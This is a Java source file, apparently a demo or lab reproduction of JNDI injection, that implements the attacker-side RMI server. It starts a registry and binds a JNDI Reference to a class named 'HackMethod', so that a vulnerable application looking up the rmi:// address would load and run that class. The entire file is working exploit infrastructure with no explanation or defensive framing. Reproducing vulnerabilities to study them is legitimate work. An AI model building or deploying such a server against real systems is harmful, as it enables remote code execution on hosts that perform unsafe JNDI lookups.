package cn.melonkid.bugs.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

/**
 * 测试远程服务
 *
 * @author zhengyuanyuan05
 * @date 2021/12/16 14:43
 **/
public class HackRemoteServer {

    public static void main(String[] args) {
        new HackRemoteServer().bootstrap();
    }

    private void bootstrap() {
        try {
            try {
                LocateRegistry.createRegistry(Config.PORT);
            }
            catch (java.rmi.server.ExportException ex) {
                System.out.println("Register the port failed:\n" + ex.getMessage());
            }

            String objAddr = "rmi://" + Config.SERVER_IP + ":" + Config.PORT + "/" + Config.OBJECT_NAME;
            System.out.println(objAddr);
            Reference reference = new Reference("cn.melonkid.bugs.hacker.HackMethod", "cn.melonkid.bugs.hacker.HackMethod", "");
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            Naming.rebind(objAddr, wrapper);
            System.out.println("Server is running...");
        }
        catch (Exception e) {
            System.out.println("Server startup failed!");
            e.printStackTrace();
        }

    }


}
